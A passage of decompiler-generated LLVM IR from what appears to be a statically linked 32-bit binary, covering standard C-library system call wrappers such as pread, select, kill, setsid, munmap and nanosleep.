  store i32 %arg2, i32* @r4, align 4
  %v0_22f70 = call i32 @__fake_pread_write64()
  ret i32 %v0_22f70
}

define i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %v0_22f9c = call i32 @__fake_pread_write64()
  ret i32 %v0_22f9c

; uselistorder directives
  uselistorder i32 ()* @__fake_pread_write64, { 1, 0 }
}

define i32 @__fake_pread_write() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_22fac = load i32, i32* @r4, align 4
  store i32 %v3_22fac, i32* %stack_var_-24, align 4
  %v0_22fb0 = load i32, i32* @r1, align 4
  store i32 %v0_22fb0, i32* %r5.global-to-local, align 4
  %v0_22fb4 = load i32, i32* @r2, align 4
  store i32 %v0_22fb4, i32* @r7, align 4
  %v0_22fc0 = load i32, i32* @r3, align 4
  store i32 %v0_22fc0, i32* %r4.global-to-local, align 4
  %v0_22fc4 = load i32, i32* @r0, align 4
  store i32 %v0_22fc4, i32* %r6.global-to-local, align 4
  %v3_22fc8 = call i32 @__libc_lseek(i32 %v0_22fc4, i32 0, i32 1)
  %v7_22fcc = icmp eq i32 %v3_22fc8, -1
  store i32 %v3_22fc8, i32* %r8.global-to-local, align 4
  br i1 %v7_22fcc, label %dec_label_pc_23058, label %dec_label_pc_22fd8

dec_label_pc_22fd8:                               ; preds = %entry
  %v0_22fd8 = load i32, i32* %r4.global-to-local, align 4
  %v0_22fdc = load i32, i32* %r6.global-to-local, align 4
  %v3_22fe4 = call i32 @__libc_lseek(i32 %v0_22fdc, i32 %v0_22fd8, i32 0)
  %v7_22fe8 = icmp eq i32 %v3_22fe4, -1
  br i1 %v7_22fe8, label %dec_label_pc_23058, label %dec_label_pc_22ff0

dec_label_pc_22ff0:                               ; preds = %dec_label_pc_22fd8
  %v3_22ff0 = load i32, i32* %stack_var_0, align 4
  %v7_22ff4 = icmp eq i32 %v3_22ff0, 1
  %v0_23004 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_22ff4, label %dec_label_pc_22ffc, label %dec_label_pc_23010

dec_label_pc_22ffc:                               ; preds = %dec_label_pc_22ff0
  %v0_22ffc = load i32, i32* %r5.global-to-local, align 4
  %v2_23008 = call i32 @__GI_write(i32 %v0_23004, i32 %v0_22ffc)
  br label %dec_label_pc_23020

dec_label_pc_23010:                               ; preds = %dec_label_pc_22ff0
  %v1_2301c = call i32 @__GI_read(i32 %v0_23004)
  br label %dec_label_pc_23020

dec_label_pc_23020:                               ; preds = %dec_label_pc_22ffc, %dec_label_pc_23010
  %storemerge = phi i32 [ %v1_2301c, %dec_label_pc_23010 ], [ %v2_23008, %dec_label_pc_22ffc ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v0_23024 = call i32 @__GI___errno_location()
  %v0_23028 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_23024, i32* %r4.global-to-local, align 4
  %v0_23034 = load i32, i32* %r6.global-to-local, align 4
  %v1_23038 = inttoptr i32 %v0_23024 to i32*
  %v2_23038 = load i32, i32* %v1_23038, align 4
  store i32 %v2_23038, i32* %r6.global-to-local, align 4
  %v3_2303c = call i32 @__libc_lseek(i32 %v0_23034, i32 %v0_23028, i32 0)
  %v3_23040 = icmp eq i32 %v3_2303c, -1
  br i1 %v3_23040, label %dec_label_pc_23048, label %dec_label_pc_23050

dec_label_pc_23048:                               ; preds = %dec_label_pc_23020
  %v0_23048 = load i32, i32* %r5.global-to-local, align 4
  %v3_23048 = icmp eq i32 %v0_23048, -1
  br i1 %v3_23048, label %dec_label_pc_23050, label %dec_label_pc_23058

dec_label_pc_23050:                               ; preds = %dec_label_pc_23048, %dec_label_pc_23020
  %v0_23050 = load i32, i32* %r6.global-to-local, align 4
  %v1_23050 = load i32, i32* %r4.global-to-local, align 4
  %v2_23050 = inttoptr i32 %v1_23050 to i32*
  store i32 %v0_23050, i32* %v2_23050, align 4
  %v0_2305c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_2305c

dec_label_pc_23058:                               ; preds = %dec_label_pc_23048, %dec_label_pc_22fd8, %entry
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_2305c

dec_label_pc_2305c:                               ; preds = %dec_label_pc_23050, %dec_label_pc_23058
  %v0_2305c = phi i32 [ %v0_2305c.pre, %dec_label_pc_23050 ], [ -1, %dec_label_pc_23058 ]
  %v2_23060 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_23060, i32* %r4.global-to-local, align 4
  ret i32 %v0_2305c

; uselistorder directives
  uselistorder i32 %v3_22fc8, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_lseek, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_2305c, { 1, 0 }
  uselistorder label %dec_label_pc_23020, { 1, 0 }
}

define i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_23078 = call i32 @__fake_pread_write()
  ret i32 %v0_23078
}

define i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_23098 = call i32 @__fake_pread_write()
  ret i32 %v0_23098

; uselistorder directives
  uselistorder i32 ()* @__fake_pread_write, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_230d8, label %dec_label_pc_230c8

dec_label_pc_230c8:                               ; preds = %entry
  %v0_230c8 = call i32 @__GI___errno_location()
  %v0_230cc = load i32, i32* %r4.global-to-local, align 4
  %v1_230cc = sub i32 0, %v0_230cc
  %v2_230d0 = inttoptr i32 %v0_230c8 to i32*
  store i32 %v1_230cc, i32* %v2_230d0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_230d8

dec_label_pc_230d8:                               ; preds = %entry, %dec_label_pc_230c8
  %v0_230d8 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_230c8 ]
  ret i32 %v0_230d8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_230d8, { 1, 0 }
}

define i32 @__GI_sigsuspend(i32 %arg1) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_230e8 = load i32, i32* @r7, align 4
  store i32 %v3_230e8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_23114, label %dec_label_pc_23104

dec_label_pc_23104:                               ; preds = %entry
  %v0_23104 = call i32 @__GI___errno_location()
  %v0_23108 = load i32, i32* %r7.global-to-local, align 4
  %v1_23108 = sub i32 0, %v0_23108
  %v2_2310c = inttoptr i32 %v0_23104 to i32*
  store i32 %v1_23108, i32* %v2_2310c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_23118.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_23114

dec_label_pc_23114:                               ; preds = %entry, %dec_label_pc_23104
  %v2_23118 = phi i32 [ %v3_230e8, %entry ], [ %v2_23118.pre, %dec_label_pc_23104 ]
  %v0_23114 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_23104 ]
  store i32 %v2_23118, i32* @r7, align 4
  ret i32 %v0_23114

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_23114, { 1, 0 }
}

define i32 @mkdir(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_23124 = load i32, i32* @r7, align 4
  store i32 %v3_23124, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_23150, label %dec_label_pc_23140

dec_label_pc_23140:                               ; preds = %entry
  %v0_23140 = call i32 @__GI___errno_location()
  %v0_23144 = load i32, i32* %r7.global-to-local, align 4
  %v1_23144 = sub i32 0, %v0_23144
  %v2_23148 = inttoptr i32 %v0_23140 to i32*
  store i32 %v1_23144, i32* %v2_23148, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_23154.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_23150

dec_label_pc_23150:                               ; preds = %entry, %dec_label_pc_23140
  %v2_23154 = phi i32 [ %v3_23124, %entry ], [ %v2_23154.pre, %dec_label_pc_23140 ]
  %v0_23150 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_23140 ]
  store i32 %v2_23154, i32* @r7, align 4
  ret i32 %v0_23150

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_23150, { 1, 0 }
}

define i32 @__libc_pause(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_23164 = ptrtoint i32* %stack_var_-16 to i32
  %v3_23170 = call i32 @__GI_sigprocmask(i32 0, i32 0, i32 %v2_23164)
  %v1_2317c = call i32 @__GI_sigsuspend(i32 %v2_23164)
  ret i32 %v1_2317c

; uselistorder directives
  uselistorder i32 (i32)* @__GI_sigsuspend, { 2, 0, 1 }
}

define i32 @__GI_setrlimit(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2318c = load i32, i32* @r7, align 4
  store i32 %v3_2318c, i32* %stack_var_-8, align 4
  %v0_23198 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_23198, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_23198, -4095
  br i1 %tmp, label %dec_label_pc_231b8, label %dec_label_pc_231a8

dec_label_pc_231a8:                               ; preds = %entry
  %v0_231a8 = call i32 @__GI___errno_location()
  %v0_231ac = load i32, i32* %r7.global-to-local, align 4
  %v1_231ac = sub i32 0, %v0_231ac
  %v2_231b0 = inttoptr i32 %v0_231a8 to i32*
  store i32 %v1_231ac, i32* %v2_231b0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_231b8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_231b8

dec_label_pc_231b8:                               ; preds = %entry, %dec_label_pc_231a8
  %v1_231bc = phi i32 [ %v0_23198, %entry ], [ -1, %dec_label_pc_231a8 ]
  %v2_231b8 = phi i32 [ %v3_2318c, %entry ], [ %v2_231b8.pre, %dec_label_pc_231a8 ]
  store i32 %v2_231b8, i32* %r7.global-to-local, align 4
  ret i32 %v1_231bc

; uselistorder directives
  uselistorder i32 %v0_23198, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_231b8, { 1, 0 }
}

define i32 @__GI_read(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_231c0 = load i32, i32* @r7, align 4
  store i32 %v3_231c0, i32* %stack_var_-8, align 4
  %v0_231cc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_231cc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_231cc, -4095
  br i1 %tmp, label %dec_label_pc_231ec, label %dec_label_pc_231dc

dec_label_pc_231dc:                               ; preds = %entry
  %v0_231dc = call i32 @__GI___errno_location()
  %v0_231e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_231e0 = sub i32 0, %v0_231e0
  %v2_231e4 = inttoptr i32 %v0_231dc to i32*
  store i32 %v1_231e0, i32* %v2_231e4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_231ec.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_231ec

dec_label_pc_231ec:                               ; preds = %entry, %dec_label_pc_231dc
  %v1_231f0 = phi i32 [ %v0_231cc, %entry ], [ -1, %dec_label_pc_231dc ]
  %v2_231ec = phi i32 [ %v3_231c0, %entry ], [ %v2_231ec.pre, %dec_label_pc_231dc ]
  store i32 %v2_231ec, i32* @r7, align 4
  ret i32 %v1_231f0

; uselistorder directives
  uselistorder i32 %v0_231cc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_231ec, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_231f8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_231f8, i32* @r1, align 4
  %v2_23204 = call i32 @getrlimit(i32 7, i32 %v2_231f8)
  %v1_23208 = icmp slt i32 %v2_23204, 0
  %v5_2320c = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_23208, i32 256, i32 %v5_2320c
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_231f8, { 1, 0 }
}

define i32 @sched_get_priority_min(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_23220 = load i32, i32* @r7, align 4
  store i32 %v3_23220, i32* %stack_var_-8, align 4
  %v0_2322c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2322c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_2322c, -4095
  br i1 %tmp, label %dec_label_pc_2324c, label %dec_label_pc_2323c

dec_label_pc_2323c:                               ; preds = %entry
  %v0_2323c = call i32 @__GI___errno_location()
  %v0_23240 = load i32, i32* %r7.global-to-local, align 4
  %v1_23240 = sub i32 0, %v0_23240
  %v2_23244 = inttoptr i32 %v0_2323c to i32*
  store i32 %v1_23240, i32* %v2_23244, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_2324c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_2324c

dec_label_pc_2324c:                               ; preds = %entry, %dec_label_pc_2323c
  %v1_23250 = phi i32 [ %v0_2322c, %entry ], [ -1, %dec_label_pc_2323c ]
  %v2_2324c = phi i32 [ %v3_23220, %entry ], [ %v2_2324c.pre, %dec_label_pc_2323c ]
  store i32 %v2_2324c, i32* %r7.global-to-local, align 4
  ret i32 %v1_23250

; uselistorder directives
  uselistorder i32 %v0_2322c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2324c, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_23254 = load i32, i32* @r7, align 4
  store i32 %v3_23254, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_2327c, label %dec_label_pc_2326c

dec_label_pc_2326c:                               ; preds = %entry
  %v0_2326c = call i32 @__GI___errno_location()
  %v0_23270 = load i32, i32* %r7.global-to-local, align 4
  %v1_23270 = sub i32 0, %v0_23270
  %v2_23274 = inttoptr i32 %v0_2326c to i32*
  store i32 %v1_23270, i32* %v2_23274, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_23280.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_2327c

dec_label_pc_2327c:                               ; preds = %entry, %dec_label_pc_2326c
  %v2_23280 = phi i32 [ %v3_23254, %entry ], [ %v2_23280.pre, %dec_label_pc_2326c ]
  %v0_2327c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_2326c ]
  store i32 %v2_23280, i32* @r7, align 4
  ret i32 %v0_2327c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2327c, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_23288 = load i32, i32* @r7, align 4
  store i32 %v3_23288, i32* %stack_var_-8, align 4
  %v0_23294 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_23294, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_23294, -4095
  br i1 %tmp, label %dec_label_pc_232b4, label %dec_label_pc_232a4

dec_label_pc_232a4:                               ; preds = %entry
  %v0_232a4 = call i32 @__GI___errno_location()
  %v0_232a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_232a8 = sub i32 0, %v0_232a8
  %v2_232ac = inttoptr i32 %v0_232a4 to i32*
  store i32 %v1_232a8, i32* %v2_232ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_232b4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_232b4

dec_label_pc_232b4:                               ; preds = %entry, %dec_label_pc_232a4
  %v1_232b8 = phi i32 [ %v0_23294, %entry ], [ -1, %dec_label_pc_232a4 ]
  %v2_232b4 = phi i32 [ %v3_23288, %entry ], [ %v2_232b4.pre, %dec_label_pc_232a4 ]
  store i32 %v2_232b4, i32* @r7, align 4
  ret i32 %v1_232b8

; uselistorder directives
  uselistorder i32 %v0_23294, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_232b4, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_232f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_232f8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_232f8, -4095
  br i1 %tmp, label %dec_label_pc_23318, label %dec_label_pc_23308

dec_label_pc_23308:                               ; preds = %entry
  %v0_23308 = call i32 @__GI___errno_location()
  %v0_2330c = load i32, i32* %r7.global-to-local, align 4
  %v1_2330c = sub i32 0, %v0_2330c
  %v2_23310 = inttoptr i32 %v0_23308 to i32*
  store i32 %v1_2330c, i32* %v2_23310, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_23318

dec_label_pc_23318:                               ; preds = %entry, %dec_label_pc_23308
  %v1_23324 = phi i32 [ %v0_232f8, %entry ], [ -1, %dec_label_pc_23308 ]
  ret i32 %v1_23324

; uselistorder directives
  uselistorder i32 %v0_232f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_23318, { 1, 0 }
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_23364 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_23364, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_23364, -4095
  br i1 %tmp, label %dec_label_pc_23384, label %dec_label_pc_23374

dec_label_pc_23374:                               ; preds = %entry
  %v0_23374 = call i32 @__GI___errno_location()
  %v0_23378 = load i32, i32* %r7.global-to-local, align 4
  %v1_23378 = sub i32 0, %v0_23378
  %v2_2337c = inttoptr i32 %v0_23374 to i32*
  store i32 %v1_23378, i32* %v2_2337c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_23384

dec_label_pc_23384:                               ; preds = %entry, %dec_label_pc_23374
  %v1_23390 = phi i32 [ %v0_23364, %entry ], [ -1, %dec_label_pc_23374 ]
  ret i32 %v1_23390

; uselistorder directives
  uselistorder i32 %v0_23364, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_23384, { 1, 0 }
}

define i32 @__GI_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_23394 = load i32, i32* @r7, align 4
  store i32 %v3_23394, i32* %stack_var_-8, align 4
  %v0_233a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_233a0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_233a0, -4095
  br i1 %tmp, label %dec_label_pc_233c0, label %dec_label_pc_233b0

dec_label_pc_233b0:                               ; preds = %entry
  %v0_233b0 = call i32 @__GI___errno_location()
  %v0_233b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_233b4 = sub i32 0, %v0_233b4
  %v2_233b8 = inttoptr i32 %v0_233b0 to i32*
  store i32 %v1_233b4, i32* %v2_233b8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_233c0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_233c0

dec_label_pc_233c0:                               ; preds = %entry, %dec_label_pc_233b0
  %v1_233c4 = phi i32 [ %v0_233a0, %entry ], [ -1, %dec_label_pc_233b0 ]
  %v2_233c0 = phi i32 [ %v3_23394, %entry ], [ %v2_233c0.pre, %dec_label_pc_233b0 ]
  store i32 %v2_233c0, i32* @r7, align 4
  ret i32 %v1_233c4

; uselistorder directives
  uselistorder i32 %v0_233a0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_233c0, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_233c8 = load i32, i32* @r7, align 4
  store i32 %v3_233c8, i32* %stack_var_-8, align 4
  %v0_233d4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_233d4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_233d4, -4095
  br i1 %tmp, label %dec_label_pc_233f4, label %dec_label_pc_233e4

dec_label_pc_233e4:                               ; preds = %entry
  %v0_233e4 = call i32 @__GI___errno_location()
  %v0_233e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_233e8 = sub i32 0, %v0_233e8
  %v2_233ec = inttoptr i32 %v0_233e4 to i32*
  store i32 %v1_233e8, i32* %v2_233ec, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_233f4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_233f4

dec_label_pc_233f4:                               ; preds = %entry, %dec_label_pc_233e4
  %v1_233f8 = phi i32 [ %v0_233d4, %entry ], [ -1, %dec_label_pc_233e4 ]
  %v2_233f4 = phi i32 [ %v3_233c8, %entry ], [ %v2_233f4.pre, %dec_label_pc_233e4 ]
  store i32 %v2_233f4, i32* @r7, align 4
  ret i32 %v1_233f8

; uselistorder directives
  uselistorder i32 %v0_233d4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_233f4, { 1, 0 }
}

define i32 @sched_get_priority_max(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_233fc = load i32, i32* @r7, align 4
  store i32 %v3_233fc, i32* %stack_var_-8, align 4
  %v0_23408 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_23408, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_23408, -4095
  br i1 %tmp, label %dec_label_pc_23428, label %dec_label_pc_23418

dec_label_pc_23418:                               ; preds = %entry
  %v0_23418 = call i32 @__GI___errno_location()
  %v0_2341c = load i32, i32* %r7.global-to-local, align 4
  %v1_2341c = sub i32 0, %v0_2341c
  %v2_23420 = inttoptr i32 %v0_23418 to i32*
  store i32 %v1_2341c, i32* %v2_23420, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_23428.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_23428

dec_label_pc_23428:                               ; preds = %entry, %dec_label_pc_23418
  %v1_2342c = phi i32 [ %v0_23408, %entry ], [ -1, %dec_label_pc_23418 ]
  %v2_23428 = phi i32 [ %v3_233fc, %entry ], [ %v2_23428.pre, %dec_label_pc_23418 ]
  store i32 %v2_23428, i32* @r7, align 4
  ret i32 %v1_2342c

; uselistorder directives
  uselistorder i32 %v0_23408, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_23428, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_23430 = load i32, i32* @r7, align 4
  store i32 %v3_23430, i32* %stack_var_-8, align 4
  %v0_2343c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2343c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_2343c, -4095
  br i1 %tmp, label %dec_label_pc_2345c, label %dec_label_pc_2344c

dec_label_pc_2344c:                               ; preds = %entry
  %v0_2344c = call i32 @__GI___errno_location()
  %v0_23450 = load i32, i32* %r7.global-to-local, align 4
  %v1_23450 = sub i32 0, %v0_23450
  %v2_23454 = inttoptr i32 %v0_2344c to i32*
  store i32 %v1_23450, i32* %v2_23454, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_2345c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_2345c

dec_label_pc_2345c:                               ; preds = %entry, %dec_label_pc_2344c
  %v1_23460 = phi i32 [ %v0_2343c, %entry ], [ -1, %dec_label_pc_2344c ]
  %v2_2345c = phi i32 [ %v3_23430, %entry ], [ %v2_2345c.pre, %dec_label_pc_2344c ]
  store i32 %v2_2345c, i32* @r7, align 4
  ret i32 %v1_23460

; uselistorder directives
  uselistorder i32 %v0_2343c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2345c, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_23464 = load i32, i32* @r7, align 4
  store i32 %v3_23464, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_2348c, label %dec_label_pc_2347c

dec_label_pc_2347c:                               ; preds = %entry
  %v0_2347c = call i32 @__GI___errno_location()
  %v0_23480 = load i32, i32* %r7.global-to-local, align 4
  %v1_23480 = sub i32 0, %v0_23480
  %v2_23484 = inttoptr i32 %v0_2347c to i32*
  store i32 %v1_23480, i32* %v2_23484, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_23490.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_2348c

dec_label_pc_2348c:                               ; preds = %entry, %dec_label_pc_2347c
  %v2_23490 = phi i32 [ %v3_23464, %entry ], [ %v2_23490.pre, %dec_label_pc_2347c ]
  %v0_2348c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_2347c ]
  store i32 %v2_23490, i32* @r7, align 4
  ret i32 %v0_2348c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2348c, { 1, 0 }
}

define i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_23498 = load i32, i32* @r7, align 4
  store i32 %v3_23498, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_234c0, label %dec_label_pc_234b0

dec_label_pc_234b0:                               ; preds = %entry
  %v0_234b0 = call i32 @__GI___errno_location()
  %v0_234b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_234b4 = sub i32 0, %v0_234b4
  %v2_234b8 = inttoptr i32 %v0_234b0 to i32*
  store i32 %v1_234b4, i32* %v2_234b8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_234c4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_234c0

dec_label_pc_234c0:                               ; preds = %entry, %dec_label_pc_234b0
